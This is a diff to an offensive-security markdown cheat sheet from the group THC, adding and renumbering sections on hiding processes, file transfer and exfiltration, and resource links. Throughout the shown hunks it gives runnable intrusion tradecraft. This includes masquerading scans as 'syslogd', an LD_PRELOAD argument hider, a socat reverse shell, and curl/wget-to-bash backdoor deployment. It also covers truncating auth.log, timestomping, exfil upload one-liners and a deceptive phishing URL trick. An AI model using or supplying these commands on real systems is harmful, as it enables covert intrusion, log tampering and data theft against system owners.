@@ -1,6 +1,8 @@
 <!-- Use `grip 8080` to render the markdown locally -->
 # THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
+https://tinyurl.com/thctips
+
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
 
 We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.
@@ -34,6 +36,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Brute Force Passwords](#bruteforce)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
+   1. [File transfer using cut & paste](#cut-paste)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
@@ -115,15 +118,24 @@ $  id
 ```
 
 <a id="bash-hide-command"></a>
-**1.ii. Hide your command**
+**1.ii. Hide your command / Daemonzie your command**
+
+Hide as "syslogd".
 
 ```shell
 (exec -a syslogd nmap -T0 10.0.2.1/24) # Note the brackets '(' and ')'
 ```
 
-Starting a background hidden process:
+Start a background hidden process:
 ```
-exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &
+(exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &)
+```
+
+Start within a [GNU screen](https://linux.die.net/man/1/screen):
+```
+screen -dmS MyName nmap -T0 10.0.2.1/24
+### Attach back to the nmap process
+screen -x MyName
 ```
 
 Alternatively if there is no Bash:
@@ -136,11 +148,13 @@ In this example we execute *nmap* but let it appear with the name *syslogd* in *
 <a id="bash-hide-arguments"></a>
 **1.iii. Hide your arguments**
 
-Download [zap-args.c](src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
+Download [zap-args.c](https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
 
 ```sh
 gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
-LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
+(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24)
+### Or as daemon background process:
+(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24 &>nmap.log &)
 ```
 Note: There is a gdb variant as well. Anyone?
 
@@ -776,9 +790,18 @@ xxd -p </etc/issue.net
 xxd -p -r >issue.net-COPY
 ```
 
-<a id="file-transfer-screen"></a>
+<a id="cut-paste"></a>
+### 4.ii. File transfer - using cut & paste
 
-### 4.ii. File transfer - using *screen*
+Paste into a file on the remote machine (note the `<<-'__EOF__'` to not mess with tabs or $-variables).
+```sh
+cat >output.txt <<-'__EOF__'
+[...]
+__EOF__  ### Finish your cut & paste by typing __EOF__
+```
+
+<a id="file-transfer-screen"></a>
+### 4.iii. File transfer - using *screen*
 
 #### From REMOTE to LOCAL (download)
 
@@ -830,8 +853,7 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
 <a id="file-transfer-gs-netcat"></a>
-
-### 4.iii. File transfer - using gs-netcat and sftp
+### 4.iv. File transfer - using gs-netcat and sftp
 
 Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.
 
@@ -846,7 +868,7 @@ sftp -D gs-netcat                                        # Workstation
 ```
 
 <a id="http"></a>
-### 4.iv. File transfer - using HTTP
+### 4.v. File transfer - using HTTP
 
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
@@ -859,7 +881,7 @@ cloudflared tunnel -url localhost:8080
 ```
 
 <a id="burl"></a>
-### 4.iv. File transfer without curl
+### 4.vi. File transfer without curl
 
 Using bash, download only:
 ```sh
@@ -875,7 +897,7 @@ burl() {
 ```
 
 <a id="webdav"></a>
-### 4.v. File transfer - using WebDAV
+### 4.vii. File transfer - using WebDAV
 
 On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
@@ -912,7 +934,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 <a id="tg"></a>
-### 4.vi. File transfer to Telegram
+### 4.viii. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
@@ -1103,11 +1125,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
-bash -c "$(curl -fsSLk gsocket.io/x)"
+bash -c "$(curl -fsSLk https://gsocket.io/x)"
 ```
 or
 ```sh
-bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
@@ -1234,7 +1256,7 @@ touch -r /etc/shadow /etc/passwd
 
 This will reset the logfile to 0 without having to restart syslogd etc:
 ```sh
-cat /dev/null >/var/log/auth.log
+>/var/log/auth.log # or on old shells: cat /dev/null >/var/log/auth.log
 ```
 
 This will remove any line containing the IP `1.2.3.4` from the log file:
@@ -1478,12 +1500,14 @@ Virtual Private Servers
 Proxies (we dont use any of those)
 1. [V2Ray Proxies](https://github.com/mahdibland/V2RayAggregator)
 2. [Hola Proxies](https://github.com/snawoot/hola-proxy)
-3. [proxyscrape.com](https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all)
-4. [my-proxy.com](https://www.my-proxy.com)
-5. [getfreeproxylists.blogspot.com](https://getfreeproxylists.blogspot.com/)
-6. [proxypedia.org](https://proxypedia.org/)
-7. [socks-proxy.net](https://socks-proxy.net/)
-8. [Segfault](https://www.thc.org/segfault): `curl -x socks5h://$(PROXY) ipinfo.io` - selects a random proxy for every request
+3. [Zaeem's Free Proxy List](https://github.com/Zaeem20/FREE_PROXIES_LIST)
+4. [Proxy Broker 2](https://github.com/bluet/proxybroker2)
+5. [proxyscrape.com](https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all)
+6. [my-proxy.com](https://www.my-proxy.com)
+7. [getfreeproxylists.blogspot.com](https://getfreeproxylists.blogspot.com/)
+8. [proxypedia.org](https://proxypedia.org/)
+9. [socks-proxy.net](https://socks-proxy.net/)
+10. [Segfault](https://www.thc.org/segfault): `curl -x socks5h://$(PROXY) ipinfo.io` - selects a random proxy for every request
 
 Many other services (for free)  
 1. https://free-for.dev/
@@ -1506,6 +1530,7 @@ Many other services (for free)
 | https://radiocells.org/ | Cell Tower Informations |
 | https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |
 | https://spur.us/context/me | IP rating `https://spur.us/context/<IP>` |
+| http://drs.whoisxmlapi.com | Reverse Whois Lookup (not free) |
 | https://www.abuseipdb.com | IP abuse rating |
 
 | OSINT for Detectives ||
@@ -1574,6 +1599,7 @@ Static Binaries / Warez
 
 Phishing
 1. https://github.com/htr-tech/zphisher - We don't hack like this but this is what we would use.
+2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah
 
 Tools
 1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
@@ -1594,7 +1620,6 @@ Exfil<a id="cloudexfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
-4. [AnonFiles](https://www.anonfiles.com) - `curl -F "file=@foo.txt" https://api.anonfiles.com/upload`
 5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
 6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
 7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
@@ -1608,13 +1633,23 @@ Publishing
 2. [he.net](https://dns.he.net/) - Free Nameserver service
 4. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
 
-Forums, Channels and Conferences
-1. [THC](https://t.me/thcorg) - THC's public channel
+Forums and Conferences
 1. [0x00Sec](https://0x00sec.org/) - Reverse Engineering & Hacking with a pinch of Malware
-2. [CyberArsenal](https://cyberarsenal.org/)/[Telegram](https://t.me/pwn3rzs) - Hacker Warez, tools and programs
 3. [AlligatorCon](https://www.alligatorcon.eu/) - the original
 4. [0x41con](https://0x41con.org/)
 5. [TumpiCon](https://tumpicon.org/)
+
+Telegram Channels<a id="channels"></a>
+1. [The Hacker's Choice](https://t.me/thcorg)
+1. [The Hacker News](https://t.me/thehackernews)
+1. [CyberSecurity Technologies](https://t.me/CyberSecurityTechnologies)
+1. [Offensive Twitter](https://t.me/OffensiveTwitter)
+1. [Pwn3rzs](https://t.me/Pwn3rzs)
+1. [VX-Underground](https://t.me/vxunderground)
+1. [cKure](https://t.me/cKure)
+1. [Android Security / Malware](https://t.me/androidMalware)
+1. [OSINT CyberDetective](https://t.me/cybdetective)
+1. [BookZillaaa](https://t.me/bookzillaaa)
 
 Mindmaps & Knowledge
 1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
@@ -1665,13 +1700,15 @@ rlwrap --always-readline ssh user@host
 ## 13. Other Sites
 
 1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
-2. [HTB absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html) - Well written and explained attack.
-3. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
-4. [Red Team Notes](https://www.ired.team/)
-6. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
-7. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
-8. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
-9. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)
+2. [Guacamaya Hackback](https://www.youtube.com/watch?v=5vRIisM0Op4)
+3. [Vx Underground](https://www.vx-underground.org/)
+4. [HTB absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html) - Well written and explained attack.
+5. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
+6. [Red Team Notes](https://www.ired.team/)
+7. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
+8. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
+9. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
+10. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)
 
 
 ---
